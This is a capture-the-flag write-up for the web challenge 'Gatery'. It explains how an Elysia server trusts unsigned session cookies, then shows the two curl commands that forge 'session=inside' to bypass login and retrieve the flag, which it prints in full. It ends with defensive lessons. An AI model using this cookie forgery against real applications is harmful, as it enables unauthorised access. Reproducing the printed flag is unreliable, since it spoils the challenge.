# Gatery — Web Challenge

**CTF:** Cyber Apocalypse 2026  
**Category:** Web  
**Flag:** `HTB{w3lc0me_b3y0nd_th3_g4t3_2bdbf7e4bd8a6babc7a90f5f488879ef}`

---

## Scenario

Lysa Harrowmere reaches Crownspire with proof that a trusted castle informant is selling patrol routes to the enemy. The information is being used to ambush messengers, delay supplies, and keep Stormbound's allies divided. The only person who can act on the proof is inside the castle for a closed council, but Lysa's name has been removed from the entry list and the guards have orders to admit no unscheduled visitors. If she waits, the council ends and the traitor disappears with the next route packet. If she speaks openly at the gate, the proof is seized before it reaches the right hands. Lysa must trick the guarded passage, get inside, and place the evidence with the one ally who can expose the leak before the enemy moves again.

## Analysis

The challenge presents a 2D game frontend (React + Canvas) backed by a Bun/Elysia HTTP API. Key API endpoints:

| Endpoint | Purpose | Auth Required |
|---|---|---|
| `POST /api/login` | Authenticate as admin | No |
| `GET /api/me` | Check auth status | Cookie: `admin` or `inside` |
| `POST /api/gate/open` | Confirm gate authority | Cookie: `admin` or `inside` |
| `POST /api/gate/enter` | Enter the castle | Cookie: `admin` or `inside` |
| `POST /api/flag` | Retrieve the flag | Cookie: `inside` |

The server (app/index.ts) uses Elysia's cookie signing feature:

```javascript
const app = new Elysia({
  cookie: {
    secrets: [sessionSecret],   // random 32 bytes, never exposed
    sign: [sessionCookie]       // cookie name: 'session'
  }
})
```

Session cookie lifecycle:

1. Login success → cookie `session=signed('admin')` — gate open, outside castle
2. Gate enter → cookie `session=signed('inside')` — inside castle, can get flag
3. `POST /api/flag` requires `session.value === 'inside'`

The admin password is randomly generated (`randomBytes(24).toString('base64url')`), so brute-forcing login is impossible.

### The Vulnerability

Elysia's `sign` config controls **signing on write** — when the server sets a cookie, it appends a signature. However, it does **not enforce** signature validation on incoming cookies. When a request arrives with `session=inside` (no signature prefix), Elysia accepts the bare string as a valid cookie value.

The guard check in every endpoint is purely string comparison:

```javascript
if (session.value !== 'admin' && session.value !== 'inside') {
  set.status = 403
  return { ok: false, message: 'Gate authority required' }
}
```

Passing `session=inside` satisfies this check regardless of whether the value was cryptographically signed.

## Exploitation

### Step 1 — Verify the bypass

```bash
curl -b 'session=inside' http://<target>:<port>/api/me
```

Response:
```json
{
  "authenticated": true,
  "user": { "username": "admin", "role": "admin" },
  "gateOpen": true,
  "insideGate": true
}
```

The server treats us as fully authenticated and inside the castle.

### Step 2 — Retrieve the flag

```bash
curl -b 'session=inside' -X POST http://<target>:<port>/api/flag
```

Response:
```json
{
  "ok": true,
  "flag": "HTB{w3lc0me_b3y0nd_th3_g4t3_2bdbf7e4bd8a6babc7a90f5f488879ef}"
}
```

## How We Solved It — Reasoning

The challenge narrative — "trick the guarded passage" — strongly hinted at bypassing the cookie-based authentication. Reading the server code revealed that Elysia's cookie config used `sign: ['session']` with a random secret, but this only signs outgoing cookies. The authentication checks on every endpoint compare `session.value` as a simple string against `'admin'` and `'inside'`.

The critical insight: there's no verification that incoming cookie values were actually signed. The `secrets` array is used to generate signatures on writes, but incoming unsigned values are accepted without validation. This is the classic "sign-on-write, trust-on-read" anti-pattern.

Simply setting `session=inside` as an unsigned cookie bypasses all authentication checks, immediately placing us inside the castle and granting access to the flag endpoint. Two curl commands — no login, no password, no game client needed.

## Key Takeaways

- **Cookie signing must be enforced on reads**, not just applied on writes. Use middleware that rejects unsigned or invalidly-signed cookies entirely rather than silently falling through to a bare string comparison.
- **Don't rely on string comparison for session validation.** A single hardcoded session value (`'admin'`, `'inside'`) is brittle and trivially guessable. Use opaque session tokens tied to a server-side session store.
- **Random credentials are not a defense** when the auth mechanism itself is bypassable. Even a 24-byte random admin password was irrelevant here because the cookie check was the actual attack surface.
